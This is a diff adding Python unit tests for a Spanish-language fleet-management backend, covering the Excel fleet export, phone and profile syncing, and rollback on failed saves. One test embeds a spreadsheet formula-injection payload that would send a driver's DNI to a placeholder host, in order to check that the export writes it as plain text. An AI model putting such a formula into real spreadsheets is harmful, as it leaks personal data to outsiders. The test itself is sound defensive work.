@@ -569,14 +569,30 @@ class BackendStateTestCase(unittest.IsolatedAsyncioTestCase):
             },
         }
 
+        backend.conductores_db["K-002"] = {"capacidad": 4, "chofer": "Sin copia"}
+        backend.usuarios_db["driver-002"] = {
+            "identifier": "driver-002", "rol": "Conductor", "unidad_id": "K-002",
+            "perfil_conductor": {"placa": "PER-002", "telefonoDirecto": "922222222"},
+        }
+
         with patch.object(backend, "reload_db", new=AsyncMock()):
             response = await backend.get_flota_status()
 
-        vehicle = response["flota"][0]
+        por_unidad = {v["unidad_id"]: v for v in response["flota"]}
+        vehicle = por_unidad["K-001"]
         self.assertEqual(vehicle["placa"], "K-001")
         self.assertEqual(vehicle["unidad_id"], "K-001")
-        self.assertEqual(vehicle["real_placa"], "NEW-001")
-        self.assertEqual(vehicle["celular"], "911111111")
+        # Cualquier rol con sesión lee esta lista: el DNI, la dirección y el
+        # nacimiento del conductor ya no viajan en ella.
+        for personal in ("dni", "direccion", "fecha_nacimiento"):
+            self.assertNotIn(personal, vehicle)
+        # La unidad manda, que es lo que se edita desde la ficha: antes ganaba
+        # el perfil y un teléfono cambiado en la página salía viejo.
+        self.assertEqual(vehicle["real_placa"], "OLD-001")
+        self.assertEqual(vehicle["celular"], "900000000")
+        # Lo que la unidad no tiene lo pone el perfil.
+        self.assertEqual(por_unidad["K-002"]["real_placa"], "PER-002")
+        self.assertEqual(por_unidad["K-002"]["celular"], "922222222")
 
     async def test_manager_summary_uses_compact_persisted_shape(self):
         backend.routes_summary = [{
@@ -1625,6 +1641,317 @@ class BackendStateTestCase(unittest.IsolatedAsyncioTestCase):
                     "K-001", backend.FlotaUpdate(soat="2027-05-20"), token
                 )
         self.assertEqual(caught.exception.status_code, 403)
+
+    def _unidad_con_conductor(self, padron="K-027", **unidad):
+        backend.conductores_db[padron] = {
+            "base": "MASIVO", "chofer": "CHAVEZ CHAVEZ JUAN", "placa": "BUR-628",
+            "tipo": "AUTO", "capacidad": 4, "marca": "KIA", "modelo": "CERATO",
+            "ano": "2020", "color": "GRIS", "grupo": "TP", "telefono": "922551637",
+            **unidad,
+        }
+        conductor = {
+            "identifier": f"dni-{padron}", "nombre": "Chavez", "rol": "Conductor",
+            "unidad_id": padron, "celular": "922551637",
+            "perfil_conductor": {
+                "tipoDoc": "DNI", "numDoc": "8179107", "direccion": "MZ K LOTE 3",
+                "fechaNacimiento": "1989-05-26", "telefonoDirecto": "922551637",
+                "placa": "BUR-628", "vehiculoMarca": "KIA", "vehiculoModelo": "CERATO",
+                "vehiculoAnio": "2020", "vehiculoColor": "GRIS",
+            },
+        }
+        backend.usuarios_db[f"dni-{padron}"] = conductor
+        return conductor
+
+    async def _exportar(self, base):
+        from openpyxl import load_workbook
+        with patch.object(backend, "reload_db", new=AsyncMock()):
+            respuesta = await backend.export_flota(base=base)
+        contenido = b"".join([parte async for parte in respuesta.body_iterator])
+        hoja = load_workbook(io.BytesIO(contenido)).active
+        self.ultima_hoja = hoja
+        return respuesta, [list(fila) for fila in hoja.iter_rows(min_row=2, values_only=True)]
+
+    async def _editar_unidad(self, padron, **campos):
+        persist_state = AsyncMock()
+        with (
+            patch.object(backend, "reload_db", new=AsyncMock()),
+            patch.object(backend, "_persist_app_state", new=persist_state),
+            patch.object(backend, "_load_compat_fleet", new=AsyncMock()),
+        ):
+            respuesta = await backend.update_flota(padron, backend.FlotaUpdate(**campos))
+        return respuesta, persist_state
+
+    async def test_export_takes_the_phone_edited_in_the_page(self):
+        # Pasó con la K-027: se le cambió el teléfono en la ficha y el Excel
+        # seguía sacando el del perfil del conductor.
+        self._unidad_con_conductor(telefono="999999999")
+        _, filas = await self._exportar("MASIVO")
+        self.assertEqual(filas[0][5], 999999999)
+
+    async def test_export_rows_follow_the_base_order_and_types(self):
+        self._unidad_con_conductor("K-142")
+        self._unidad_con_conductor("K-27")
+        self._unidad_con_conductor("KV-013")
+        self._unidad_con_conductor("M-056", base="REMISSE", grupo="REMISSE")
+        self._unidad_con_conductor("SM002", base="Sharf Motorizado", grupo="SHARF MOTORIZADO")
+        self._unidad_con_conductor("SM001", base="Sharf Motorizado", grupo="SHARF MOTORIZADO")
+        backend.conductores_db["K-999"] = {"chofer": "PRUEBA", "capacidad": 4}
+
+        _, filas = await self._exportar("TODAS")
+
+        # Por base, en el orden del filtro, y dentro por padrón como número.
+        self.assertEqual([f[6] for f in filas],
+                         ["K-27", "K-142", "KV-013", "M-056", "SM001", "SM002", "K-999"])
+        primera = filas[0]
+        self.assertEqual(primera[3], "08179107", "el DNI con el cero que perdió al importarse")
+        self.assertEqual(primera[4].date().isoformat(), "1989-05-26", "la fecha, como fecha")
+        self.assertEqual((primera[9], primera[12]), (4, 2020), "capacidad y año, como números")
+        # El grupo sale de lo guardado: la plantilla no conocía las de Sharf.
+        self.assertEqual(filas[4][14], "SHARF MOTORIZADO")
+        # Una unidad sin cuenta sale con lo que tiene, sin inventar nada.
+        self.assertEqual(filas[-1][:4], [None, "PRUEBA", None, None])
+
+    async def test_export_has_filters_a_fixed_header_and_readable_columns(self):
+        self._unidad_con_conductor("K-027")
+        self._unidad_con_conductor("K-142", chofer="X" * 90)
+        await self._exportar("MASIVO")
+        hoja = self.ultima_hoja
+        self.assertEqual(hoja.auto_filter.ref, "A1:O3")
+        self.assertEqual(hoja.freeze_panes, "C2")
+        anchos = {letra: hoja.column_dimensions[letra].width for letra in "BEI"}
+        # «FECHA DE NACIMIENTO» y «TIPO DE VEHÍCULO» ya no salen cortados, y un
+        # nombre desmesurado no se come la pantalla.
+        self.assertGreaterEqual(anchos["E"], len("FECHA DE NACIMIENTO"))
+        self.assertGreaterEqual(anchos["I"], len("TIPO DE VEHÍCULO"))
+        self.assertEqual(anchos["B"], backend._ANCHO_MAXIMO)
+
+    async def test_export_has_its_own_sharf_base(self):
+        self._unidad_con_conductor("K-027")
+        self._unidad_con_conductor("SM001", base="Sharf Motorizado", grupo="SHARF MOTORIZADO")
+        respuesta, filas = await self._exportar("sharf")
+        self.assertEqual([f[6] for f in filas], ["SM001"])
+        self.assertIn("SHARF", respuesta.headers["content-disposition"])
+        with self.assertRaises(HTTPException) as caught:
+            await self._exportar("OTRA")
+        self.assertEqual(caught.exception.status_code, 400)
+
+    async def test_fleet_phone_edit_also_updates_the_driver(self):
+        conductor = self._unidad_con_conductor()
+        respuesta, persist_state = await self._editar_unidad("K-027", telefono=" 999999999 ")
+
+        self.assertEqual(backend.conductores_db["K-027"]["telefono"], "999999999")
+        # El conductor ve el mismo número en su perfil, y ninguna copia queda vieja.
+        self.assertEqual(conductor["perfil_conductor"]["telefonoDirecto"], "999999999")
+        self.assertEqual(conductor["celular"], "999999999")
+        guardado = persist_state.await_args.args[0]["usuarios"]["dni-K-027"]
+        self.assertEqual(guardado["perfil_conductor"]["telefonoDirecto"], "999999999")
+        self.assertEqual(respuesta["perfil_conductor"]["telefonoDirecto"], "999999999")
+        _, filas = await self._exportar("MASIVO")
+        self.assertEqual(filas[0][5], 999999999)
+
+    async def test_fleet_edit_writes_the_rest_of_the_base_columns(self):
+        conductor = self._unidad_con_conductor()
+        await self._editar_unidad(
+            "K-027", marca=" toyota ", modelo="yaris", ano="2021", color="rojo", grupo="tp/konecta",
+            direccion="CALLE NUEVA 123", fecha_nacimiento="1990-02-03",
+        )
+
+        unidad = backend.conductores_db["K-027"]
+        self.assertEqual((unidad["marca"], unidad["modelo"], unidad["ano"], unidad["color"], unidad["grupo"]),
+                         ("TOYOTA", "YARIS", "2021", "ROJO", "TP/KONECTA"))
+        perfil = conductor["perfil_conductor"]
+        self.assertEqual((perfil["vehiculoMarca"], perfil["vehiculoAnio"]), ("TOYOTA", "2021"))
+        self.assertEqual((perfil["direccion"], perfil["fechaNacimiento"]), ("CALLE NUEVA 123", "1990-02-03"))
+        self.assertNotIn("direccion", unidad, "lo personal va a la cuenta, no a la unidad")
+        cambios = {c["campo"]: c["nuevo"] for c in backend.actividad_db[0]["changes"]}
+        self.assertEqual(cambios["Dirección"], "CALLE NUEVA 123")
+        self.assertEqual(cambios["Marca"], "TOYOTA")
+
+        _, filas = await self._exportar("MASIVO")
+        self.assertEqual(filas[0][2], "CALLE NUEVA 123")
+        self.assertEqual(filas[0][10:15], ["TOYOTA", "YARIS", 2021, "ROJO", "TP/KONECTA"])
+
+    async def test_fleet_edit_rejects_bad_values_and_units_without_driver(self):
+        self._unidad_con_conductor()
+        for campos in ({"ano": "21"}, {"fecha_nacimiento": "03/02/1990"}, {"direccion": "x" * 201}):
+            with self.assertRaises(HTTPException) as caught:
+                await self._editar_unidad("K-027", **campos)
+            self.assertEqual(caught.exception.status_code, 400, campos)
+        backend.conductores_db["K-999"] = {"chofer": "PRUEBA"}
+        with self.assertRaises(HTTPException) as caught:
+            await self._editar_unidad("K-999", direccion="CALLE 1")
+        self.assertEqual(caught.exception.status_code, 409)
+
+    async def test_fleet_edit_resyncs_a_stale_driver_copy(self):
+        # La unidad ya tenía el número y el perfil no: volver a guardarlo lo iguala.
+        conductor = self._unidad_con_conductor(telefono="999999999")
+        respuesta, persist_state = await self._editar_unidad("K-027", telefono="999999999")
+        self.assertFalse(respuesta["unchanged"])
+        persist_state.assert_awaited_once()
+        self.assertEqual(conductor["perfil_conductor"]["telefonoDirecto"], "999999999")
+
+    async def test_fleet_edit_failure_restores_the_driver_too(self):
+        conductor = self._unidad_con_conductor()
+        antes = copy.deepcopy(conductor)
+        with (
+            patch.object(backend, "reload_db", new=AsyncMock()),
+            patch.object(
+                backend, "_persist_app_state",
+                new=AsyncMock(side_effect=HTTPException(status_code=503, detail="unavailable")),
+            ),
+        ):
+            with self.assertRaises(HTTPException):
+                await backend.update_flota("K-027", backend.FlotaUpdate(telefono="999999999", direccion="OTRA"))
+        self.assertEqual(conductor, antes)
+        self.assertEqual(backend.conductores_db["K-027"]["telefono"], "922551637")
+
+    async def _resolver(self, campo, valor, accion="approve"):
+        conductor = backend.usuarios_db["dni-K-027"]
+        conductor["perfil_conductor"]["solicitudes_cambio"] = {
+            campo: {"new_value": valor, "status": "pendiente"},
+        }
+        backend.usuarios_db["admin@example.com"] = {"identifier": "admin@example.com", "rol": "Administración"}
+        with (
+            patch.object(backend, "reload_db", new=AsyncMock()),
+            patch.object(backend, "persist_users_only", new=AsyncMock()) as persist,
+        ):
+            respuesta = await backend.resolve_data_update(backend.ResolveDataRequestPayload(
+                admin_email="admin@example.com", conductor_email="dni-K-027", field=campo, action=accion,
+            ))
+        persist.assert_awaited_once()
+        return respuesta
+
+    async def test_approving_the_drivers_new_phone_reaches_the_unit(self):
+        # Sin esto, el teléfono de la unidad tapaba el que pidió el conductor.
+        conductor = self._unidad_con_conductor()
+        respuesta = await self._resolver("telefonoDirecto", "955555555")
+        self.assertEqual(backend.conductores_db["K-027"]["telefono"], "955555555")
+        self.assertEqual(conductor["celular"], "955555555")
+        self.assertEqual(respuesta["unidad"]["telefono"], "955555555")
+        _, filas = await self._exportar("MASIVO")
+        self.assertEqual(filas[0][5], 955555555)
+
+    async def test_approving_other_requests_keeps_the_unit_where_it_should(self):
+        self._unidad_con_conductor()
+        await self._resolver("vehiculoColor", "azul")
+        self.assertEqual(backend.conductores_db["K-027"]["color"], "AZUL")
+        # La capacidad que declara el conductor no es la que usa el ruteo.
+        respuesta = await self._resolver("capacidadVehiculo", "7")
+        self.assertIsNone(respuesta["unidad"])
+        self.assertEqual(backend.conductores_db["K-027"]["capacidad"], 4)
+        # Rechazar no toca nada.
+        await self._resolver("telefonoDirecto", "900000000", accion="reject")
+        self.assertEqual(backend.conductores_db["K-027"]["telefono"], "922551637")
+
+    async def test_export_never_writes_a_formula(self):
+        # Buena parte de estos datos los teclea el conductor en su alta: un «=»
+        # delante no puede convertirse en una fórmula que se ejecute al abrir.
+        conductor = self._unidad_con_conductor()
+        conductor["perfil_conductor"]["direccion"] = '=HYPERLINK("http://x.invalid/?"&D2,"ver")'
+        _, filas = await self._exportar("MASIVO")
+        celda = self.ultima_hoja.cell(2, 3)
+        self.assertEqual(celda.data_type, "s")
+        self.assertEqual(filas[0][2], '=HYPERLINK("http://x.invalid/?"&D2,"ver")')
+
+    async def test_export_colours_each_group_with_its_own_colour(self):
+        self._unidad_con_conductor("K-027")
+        self._unidad_con_conductor("M-056", base="REMISSE", grupo="REMISSE")
+        self._unidad_con_conductor("SM001", base="Sharf Motorizado", grupo="SHARF MOTORIZADO")
+        await self._exportar("TODAS")
+        hoja = self.ultima_hoja
+        relleno = {hoja.cell(r, 15).value: hoja.cell(r, 15).fill for r in (2, 3, 4)}
+        # Antes, todo lo que no era de masivo salía con el color de TP.
+        self.assertEqual(relleno["TP"].fgColor.theme, 4)
+        self.assertEqual(relleno["REMISSE"].fgColor.theme, 9)
+        self.assertIsNone(relleno["SHARF MOTORIZADO"].fill_type)
+
+    async def test_a_plate_equal_to_the_padron_is_not_a_plate(self):
+        # El alta antigua mandaba el padrón como placa; la de verdad está en el perfil.
+        self._unidad_con_conductor("K-050", placa="K-050")
+        _, filas = await self._exportar("MASIVO")
+        self.assertEqual(filas[0][7], "BUR-628")
+
+    async def test_units_created_in_the_page_export_their_drivers_dni(self):
+        backend.conductores_db["KV-001"] = {"chofer": "NUEVO", "base": "MASIVO", "capacidad": 4}
+        backend.usuarios_db["08179107"] = {
+            "identifier": "08179107", "dni": "08179107", "rol": "Conductor", "unidad_id": "KV-001",
+        }
+        _, filas = await self._exportar("MASIVO")
+        self.assertEqual(filas[0][3], "08179107")
+
+    async def test_the_base_decides_the_group(self):
+        self._unidad_con_conductor("K-027")
+        await self._editar_unidad("K-027", base="sharf")
+        unidad = backend.conductores_db["K-027"]
+        self.assertEqual((unidad["base"], unidad["grupo"]), ("Sharf Motorizado", "SHARF MOTORIZADO"))
+        # De vuelta a masivo, el grupo de otra base se vacía para elegir el cliente.
+        await self._editar_unidad("K-027", base="MASIVO")
+        self.assertEqual(backend.conductores_db["K-027"]["grupo"], "")
+        await self._editar_unidad("K-027", grupo="konecta")
+        self.assertEqual(backend.conductores_db["K-027"]["grupo"], "KONECTA")
+        for campos in ({"grupo": "REMISSE"}, {"base": "OTRA"}):
+            with self.assertRaises(HTTPException) as caught:
+                await self._editar_unidad("K-027", **campos)
+            self.assertEqual(caught.exception.status_code, 400, campos)
+
+    async def test_a_unit_created_in_the_page_gets_its_base(self):
+        with (
+            patch.object(backend, "reload_db", new=AsyncMock()),
+            patch.object(backend, "_persist_app_state", new=AsyncMock()),
+            patch.object(backend, "_load_compat_fleet", new=AsyncMock()),
+        ):
+            await backend.add_flota(backend.FlotaRegistro(
+                padron="KV-300", placa="ABC-123", capacidad=4, tipo="AUTO", chofer="Nuevo",
+                base="MASIVO", grupo="tp",
+            ))
+            await backend.add_flota(backend.FlotaRegistro(
+                padron="M-900", placa="ABC-124", capacidad=4, tipo="AUTO", chofer="Nuevo", base="remisse",
+            ))
+        self.assertEqual(backend.conductores_db["KV-300"]["base"], "MASIVO")
+        self.assertEqual(backend.conductores_db["KV-300"]["grupo"], "TP")
+        self.assertEqual(backend.conductores_db["M-900"]["grupo"], "REMISSE")
+        _, filas = await self._exportar("MASIVO")
+        self.assertEqual([f[6] for f in filas], ["KV-300"])
+
+    async def test_a_stale_loose_phone_in_the_account_is_resynced(self):
+        conductor = self._unidad_con_conductor(telefono="999999999")
+        conductor["perfil_conductor"]["telefonoDirecto"] = "999999999"
+        await self._editar_unidad("K-027", telefono="999999999")
+        self.assertEqual(conductor["celular"], "999999999")
+
+    async def test_approving_validates_before_touching_anything(self):
+        conductor = self._unidad_con_conductor()
+        with self.assertRaises(HTTPException) as caught:
+            await self._resolver("vehiculoAnio", "2O21")
+        self.assertEqual(caught.exception.status_code, 400)
+        self.assertEqual(conductor["perfil_conductor"]["vehiculoAnio"], "2020")
+        self.assertEqual(backend.conductores_db["K-027"]["ano"], "2020")
+        # Lo aprobado queda igual en las dos copias.
+        await self._resolver("vehiculoMarca", " toyota ")
+        self.assertEqual(conductor["perfil_conductor"]["vehiculoMarca"], "TOYOTA")
+        self.assertEqual(backend.conductores_db["K-027"]["marca"], "TOYOTA")
+
+    async def test_a_failed_approval_leaves_nothing_behind(self):
+        conductor = self._unidad_con_conductor()
+        conductor["perfil_conductor"]["solicitudes_cambio"] = {
+            "telefonoDirecto": {"new_value": "955555555", "status": "pendiente"},
+        }
+        antes_conductor, antes_unidad = copy.deepcopy(conductor), dict(backend.conductores_db["K-027"])
+        backend.usuarios_db["admin@example.com"] = {"identifier": "admin@example.com", "rol": "Administración"}
+        with (
+            patch.object(backend, "reload_db", new=AsyncMock()),
+            patch.object(
+                backend, "persist_users_only",
+                new=AsyncMock(side_effect=HTTPException(status_code=503, detail="unavailable")),
+            ),
+        ):
+            with self.assertRaises(HTTPException):
+                await backend.resolve_data_update(backend.ResolveDataRequestPayload(
+                    admin_email="admin@example.com", conductor_email="dni-K-027",
+                    field="telefonoDirecto", action="approve",
+                ))
+        self.assertEqual(conductor, antes_conductor)
+        self.assertEqual(backend.conductores_db["K-027"], antes_unidad)
 
     async def test_fleet_create_accepts_empty_dates_and_verifies_persistence(self):
         with (
@@ -3163,9 +3490,14 @@ class BackendStateTestCase(unittest.IsolatedAsyncioTestCase):
     def test_seeding_a_unit_never_overwrites_what_administration_set(self):
         conductor = {
             "nombre": "ANYELO BILL",
-            "perfil_conductor": {"nombres": "ANYELO BILL", "vehiculoCapacidad": 12},
+            "perfil_conductor": {
+                "nombres": "ANYELO BILL", "vehiculoCapacidad": 12, "telefonoDirecto": "955555555",
+            },
         }
-        existente = {"KAP-009": {"chofer": "NOMBRE CORREGIDO A MANO", "capacidad": 20, "tipo": "Sprinter"}}
+        existente = {"KAP-009": {
+            "chofer": "NOMBRE CORREGIDO A MANO", "capacidad": 20, "tipo": "Sprinter",
+            "telefono": "900000000",
+        }}
         with mock.patch.dict(backend.conductores_db, existente, clear=True):
             backend._sembrar_unidad("KAP-009", conductor)
             unidad = backend.conductores_db["KAP-009"]
@@ -3173,6 +3505,9 @@ class BackendStateTestCase(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(unidad["chofer"], "NOMBRE CORREGIDO A MANO")
         self.assertEqual(unidad["capacidad"], 20)
         self.assertEqual(unidad["tipo"], "Sprinter")
+        # El teléfono sí: es el de quien maneja la unidad, y el del conductor
+        # anterior se quedaba en la ficha y en el Excel.
+        self.assertEqual(unidad["telefono"], "955555555")
 
     def test_seeding_a_unit_ignores_a_capacity_that_is_not_usable(self):
         for declarada in ("", None, "cero", 0, -3):
